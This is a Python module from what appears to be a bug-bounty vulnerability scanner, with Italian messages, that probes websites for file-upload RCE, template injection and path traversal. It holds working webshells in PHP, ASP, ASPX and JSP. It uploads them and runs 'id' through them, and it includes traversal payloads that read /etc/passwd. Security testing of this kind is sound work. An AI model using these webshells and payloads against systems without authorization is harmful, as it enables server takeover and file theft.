"""Remote Code Execution (RCE) detection module.

Covers:
  - File upload bypass (dangerous extensions, MIME spoofing)
  - Server-Side Template Injection (SSTI)
  - PHP code injection via user input
  - Path traversal in file parameters
"""

import logging
import io
import re
import time
from urllib.parse import urlparse, urljoin

import requests
from bs4 import BeautifulSoup

from bugbounty_scanner.config import (
    DEFAULT_TIMEOUT,
    SEVERITY_CRITICAL,
    SEVERITY_HIGH,
    SEVERITY_MEDIUM,
)
from bugbounty_scanner.scanner import Finding

logger = logging.getLogger("bugbounty_scanner")


# SSTI detection: math expression that should return 49 if evaluated
SSTI_PAYLOADS = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("#{7*7}", "49"),
    ("*{7*7}", "49"),
    ("@(7*7)", "49"),
    ("{php}echo 7*7;{/php}", "49"),
]

# Dangerous upload extensions to attempt
DANGEROUS_EXTENSIONS = [
    ("shell.php", "<?php system($_GET['cmd']); ?>", "application/octet-stream"),
    ("shell.php5", "<?php system($_GET['cmd']); ?>", "application/octet-stream"),
    ("shell.phtml", "<?php system($_GET['cmd']); ?>", "application/octet-stream"),
    ("shell.php.jpg", "<?php system($_GET['cmd']); ?>", "image/jpeg"),
    ("shell.asp", "<% Response.Write(CreateObject(\"WScript.Shell\").Exec(Request.QueryString(\"cmd\")).StdOut.ReadAll) %>", "application/octet-stream"),
    ("shell.aspx", "<%@ Page Language=\"C#\" %><% Response.Write(System.Diagnostics.Process.Start(\"cmd.exe\", \"/c \" + Request[\"cmd\"]).StandardOutput.ReadToEnd()); %>", "application/octet-stream"),
    ("shell.jsp", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "application/octet-stream"),
]

# Path traversal sequences to detect file read
PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\..\\windows\\win.ini",
    "%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
]

# PHP injection via eval-like constructs
PHP_INJECTION_PAYLOADS = [
    "<?php echo 'RCE_TEST_7x7='.49; ?>",
    "<?=49?>",
]


class RCEModule:
    """Detects Remote Code Execution via file upload, SSTI, and code injection."""

    name = "rce"

    def __init__(self, http_session=None):
        if http_session:
            self.session = http_session
        else:
            from bugbounty_scanner.http_session import HttpSession
            self.session = HttpSession()

    def run(self, target, scan_result):
        findings = []

        # 1. Find upload forms from crawler or crawl now
        forms = getattr(scan_result, "discovered_forms", [])
        if not forms:
            forms = self._quick_crawl_forms(target)

        upload_forms = [f for f in forms if self._is_upload_form(f)]
        logger.info(f"  [RCE] Trovati {len(upload_forms)} form di upload")

        for form in upload_forms:
            findings.extend(self._test_file_upload(form, target))

        # 2. SSTI on all discovered parameters
        findings.extend(self._test_ssti(target, scan_result))

        # 3. Path traversal on file-related parameters
        findings.extend(self._test_path_traversal(target, scan_result))

        return findings

    # ------------------------------------------------------------------
    # File Upload Tests
    # ------------------------------------------------------------------

    def _quick_crawl_forms(self, target):
        """Minimal form discovery when crawler hasn't run."""
        forms = []
        try:
            resp = self.session.get(target, timeout=DEFAULT_TIMEOUT)
            soup = BeautifulSoup(resp.text, "html.parser")
            parsed = urlparse(target)

            for form in soup.find_all("form"):
                action = form.get("action", "")
                method = form.get("method", "GET").upper()
                full_action = urljoin(target, action) if action else target

                fields = [
                    inp.get("name") for inp in form.find_all(["input", "textarea", "select"])
                    if inp.get("name")
                ]
                input_types = [
                    inp.get("type", "") for inp in form.find_all("input")
                ]

                forms.append({
                    "action": full_action,
                    "method": method,
                    "fields": fields,
                    "input_types": input_types,
                    "page": target,
                })
        except requests.RequestException:
            pass
        return forms

    def _is_upload_form(self, form):
        """Return True if the form has a file input."""
        types = form.get("input_types", [])
        return "file" in types

    def _test_file_upload(self, form, target):
        """Try uploading dangerous files and check if they're accessible."""
        findings = []
        upload_url = form.get("action", target)
        fields = form.get("fields", [])

        for filename, content, mime_type in DANGEROUS_EXTENSIONS:
            for field_name in fields:
                try:
                    file_obj = io.BytesIO(content.encode())
                    files = {field_name: (filename, file_obj, mime_type)}
                    data = {f: "test" for f in fields if f != field_name}

                    resp = self.session.post(
                        upload_url,
                        files=files,
                        data=data,
                        timeout=DEFAULT_TIMEOUT,
                        allow_redirects=True,
                    )

                    # Check if upload succeeded and file URL is returned
                    uploaded_url = self._extract_uploaded_url(resp, target, filename)
                    if uploaded_url:
                        # Try to access and execute the file
                        exec_resp = self.session.get(
                            f"{uploaded_url}?cmd=id",
                            timeout=DEFAULT_TIMEOUT,
                        )
                        if re.search(r"uid=\d+\(", exec_resp.text):
                            findings.append(Finding(
                                title=f"RCE via File Upload - Webshell eseguita ({filename})",
                                severity=SEVERITY_CRITICAL,
                                url=upload_url,
                                description=(
                                    f"File upload non sicuro: è stato possibile caricare '{filename}' "
                                    f"ed eseguire comandi di sistema sul server. "
                                    f"Webshell accessibile a: {uploaded_url}"
                                ),
                                evidence=(
                                    f"Upload URL: {upload_url}\n"
                                    f"File: {filename}\n"
                                    f"Webshell URL: {uploaded_url}\n"
                                    f"Output comando 'id': {exec_resp.text[:200]}"
                                ),
                                remediation=(
                                    "Validare l'estensione e il MIME type server-side. "
                                    "Salvare i file fuori dalla webroot. "
                                    "Rinominare i file caricati con nomi casuali. "
                                    "Usare Content-Disposition: attachment per i download."
                                ),
                                module=self.name,
                                cwe="CWE-434",
                            ))
                            return findings  # Un RCE confermato è sufficiente

                        elif resp.status_code in (200, 201) and uploaded_url:
                            findings.append(Finding(
                                title=f"File Upload non sicuro - {filename} accettato",
                                severity=SEVERITY_HIGH,
                                url=upload_url,
                                description=(
                                    f"Il server ha accettato l'upload di '{filename}' (estensione eseguibile). "
                                    f"Non è stato possibile confermare l'esecuzione ma il file è accessibile."
                                ),
                                evidence=f"Upload HTTP {resp.status_code}, file a: {uploaded_url}",
                                remediation="Bloccare upload di estensioni eseguibili (.php, .asp, .jsp, ecc.).",
                                module=self.name,
                                cwe="CWE-434",
                            ))

                except requests.RequestException:
                    continue

        return findings

    def _extract_uploaded_url(self, resp, target, filename):
        """Try to find the URL of the uploaded file in the response."""
        # Look for JSON response with file URL
        try:
            data = resp.json()
            for key in ("url", "file", "path", "location", "src", "href", "link"):
                if key in data:
                    url = data[key]
                    if not url.startswith("http"):
                        url = urljoin(target, url)
                    return url
        except Exception:
            pass

        # Look in HTML body
        try:
            soup = BeautifulSoup(resp.text, "html.parser")
            name_base = filename.split(".")[0]
            for tag in soup.find_all(["a", "img", "script", "iframe"], src=True) + soup.find_all("a", href=True):
                attr = tag.get("src") or tag.get("href", "")
                if name_base in attr or filename in attr:
                    return urljoin(target, attr)
        except Exception:
            pass

        # Guess common upload paths
        parsed = urlparse(target)
        for guess in [f"/uploads/{filename}", f"/files/{filename}", f"/media/{filename}", f"/upload/{filename}"]:
            guess_url = f"{parsed.scheme}://{parsed.netloc}{guess}"
            try:
                chk = self.session.get(guess_url, timeout=5)
                if chk.status_code == 200:
                    return guess_url
            except Exception:
                pass

        return None

    # ------------------------------------------------------------------
    # SSTI Tests
    # ------------------------------------------------------------------

    def _test_ssti(self, target, scan_result):
        """Test all discovered parameters for Server-Side Template Injection."""
        findings = []
        from urllib.parse import parse_qs, urlencode, urlunparse

        parsed = urlparse(target)
        params = list(parse_qs(parsed.query, keep_blank_values=True).keys())

        # Also add params from discovered_params
        for param_info in getattr(scan_result, "discovered_params", []):
            pname = param_info.split(" (")[0].strip()
            if pname not in params:
                params.append(pname)

        for param_name in params:
            for payload, expected in SSTI_PAYLOADS:
                from urllib.parse import parse_qs as _pqs
                base_params = _pqs(parsed.query, keep_blank_values=True)
                test_params = {k: v[0] if isinstance(v, list) else v for k, v in base_params.items()}
                test_params[param_name] = payload
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, urlencode(test_params), parsed.fragment,
                ))
                try:
                    resp = self.session.get(test_url, timeout=DEFAULT_TIMEOUT)
                    if expected in resp.text:
                        findings.append(Finding(
                            title=f"Server-Side Template Injection (SSTI) in '{param_name}'",
                            severity=SEVERITY_CRITICAL,
                            url=test_url,
                            description=(
                                f"Il parametro '{param_name}' è vulnerabile a SSTI. "
                                f"Il payload '{payload}' è stato valutato dal motore di template "
                                f"e ha restituito '{expected}'. Questo può portare a RCE."
                            ),
                            evidence=f"Payload: {payload} → Risultato atteso '{expected}' trovato nella risposta",
                            remediation=(
                                "Non inserire mai input utente direttamente nei template. "
                                "Usare la sandbox del motore di template se disponibile. "
                                "Validare e sanificare tutti gli input."
                            ),
                            module=self.name,
                            cwe="CWE-1336",
                        ))
                        break  # Trovato per questo param
                except requests.RequestException:
                    continue

        return findings

    # ------------------------------------------------------------------
    # Path Traversal Tests
    # ------------------------------------------------------------------

    def _test_path_traversal(self, target, scan_result):
        """Test file-related parameters for path traversal."""
        findings = []
        from urllib.parse import parse_qs, urlencode, urlunparse

        FILE_PARAMS = [
            "file", "path", "page", "doc", "document", "template", "view",
            "include", "load", "read", "open", "name", "filename", "dir",
            "folder", "source", "src",
        ]

        parsed = urlparse(target)
        params = parse_qs(parsed.query, keep_blank_values=True)

        target_params = [p for p in params if p.lower() in FILE_PARAMS]

        # Also pick up from discovered params
        for param_info in getattr(scan_result, "discovered_params", []):
            pname = param_info.split(" (")[0].strip()
            if pname.lower() in FILE_PARAMS and pname not in target_params:
                target_params.append(pname)

        for param_name in target_params:
            for payload in PATH_TRAVERSAL_PAYLOADS:
                base_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                base_params[param_name] = payload
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, urlencode(base_params), parsed.fragment,
                ))
                try:
                    resp = self.session.get(test_url, timeout=DEFAULT_TIMEOUT)
                    if re.search(r"root:.*:0:0:", resp.text) or re.search(r"\[extensions\]", resp.text):
                        system_file = "/etc/passwd" if "passwd" in payload else "win.ini"
                        findings.append(Finding(
                            title=f"Path Traversal / LFI in '{param_name}'",
                            severity=SEVERITY_CRITICAL,
                            url=test_url,
                            description=(
                                f"Il parametro '{param_name}' permette la lettura di file arbitrari "
                                f"dal server. Contenuto di '{system_file}' trovato nella risposta."
                            ),
                            evidence=f"Payload: {payload}\nURL: {test_url}",
                            remediation=(
                                "Validare i path con una whitelist. "
                                "Usare realpath() per canonicalizzare i path e verificare che rimangano nella directory consentita. "
                                "Non concatenare input utente a percorsi di file."
                            ),
                            module=self.name,
                            cwe="CWE-22",
                        ))
                        break
                except requests.RequestException:
                    continue

        return findings
